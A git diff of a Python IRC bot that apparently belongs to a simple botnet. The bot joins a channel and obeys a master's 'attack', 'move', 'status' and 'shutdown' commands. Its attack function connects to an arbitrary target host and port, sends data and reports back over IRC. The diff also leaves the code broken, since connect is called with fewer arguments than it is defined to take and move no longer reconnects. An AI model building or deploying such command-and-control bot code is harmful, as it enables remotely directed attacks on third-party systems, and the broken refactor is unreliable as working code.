@@ -14,8 +14,8 @@ except Exception as err:
     sys.exit()
 
 
-# use to establish the first connection with a irc
-def connect():
+# use to establish connection with a irc
+def connect(irc, hostname, port, channel):
     while True:
         botname = "bot"+str(random.randint(0,999999))
         irc.connect((hostname, port))
@@ -30,13 +30,11 @@ def connect():
         if state_code != "001":
             time.sleep(5)
             continue
-        else:
-            if joinChannel(channel):
-                break
+
     return
 
 # join channel
-def joinChannel(name):
+def joinChannel(irc,name):
     msg = "JOIN #" +name+" \r\n"
     irc.send(msg.encode())
     indata = irc.recv(1024)
@@ -71,48 +69,32 @@ def attack(masterName, hostname,port):
         s.connect((hostname,int(port)))
         attack = botname+str(atkCounter)
         s.send(attack.encode())
-        msg = "PRIVMSG "+masterName+" :success\r\n"
+        msg = "PRIVMSG "+masterName+" :attack success\r\n"
         irc.send(msg.encode())
     except Exception as err:
-        msg = "PRIVMSG "+masterName+" :fail, "+str(err)+"\r\n"
+        msg = "PRIVMSG "+masterName+" :attack fail, "+str(err)+"\r\n"
         irc.send(msg.encode())
     return
 #use to move
-def move(hostname1,port1,channel1):
-    global irc
-    while True:
-        # if not the same server connect
-        if hostname1 != hostname and port1 != port:
-            botname = "bot"+str(random.randint(0,999999))
-            irc.connect((hostname1, port1))
-            msg = "NICK " + botname + "\r\n"
-            irc.send(msg.encode())
-            msg = "USER "+botname+" * * : bot " + botname +"\r\n"
-            irc.send(msg.encode())
-            indata = irc.recv(1024)
-            inmsg = indata.decode("utf-8").split("\r\n")
-            state_code=inmsg[0].split()[1]
-            # wait 5s before retrying to coneect
-            if state_code != "001":
-                time.sleep(5)
-                continue
-        else:
-            #disconnect from current channel
-            msg = "PART #"+channel+"\r\n"
-            irc.send(msg.encode())
+def move(masterName,hostname1,port1,channel1):
+    global botname
+    global hostname
+    global port
+    global channel
 
-        if joinChannel(channel1):
-            break
 
+
+
+
+    hostname = hostname1
+    port = port1
+    channel = channel1
     return
 # use the listen to chat
 def listen():
     global atkCounter
-    global hostname
-    global port
-    global channel
-    while True:
 
+    while True:
         indata = irc.recv(1024)
         inmsg = indata.decode("utf-8").split()
         print(inmsg)
@@ -133,10 +115,8 @@ def listen():
                 elif inCmd == 'status':
                     status(masterName)
                 elif inCmd == 'move':
-                    move(inmsg[5],int(inmsg[6]),inmsg[7])
-                    hostname = inmsg[5]
-                    port = int(inmsg[6])
-                    channel = inmsg[7]
+                    move(masterName,inmsg[5],int(inmsg[6]),inmsg[7])
+
                 elif inCmd == 'shutdown':
                     shutdown()
 
@@ -154,5 +134,6 @@ irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 botname = ""
 atkCounter = 0
 while True:
-    connect()
+    connect(irc,hostname,port)
+    joinChannel(irc,channel)
     listen()
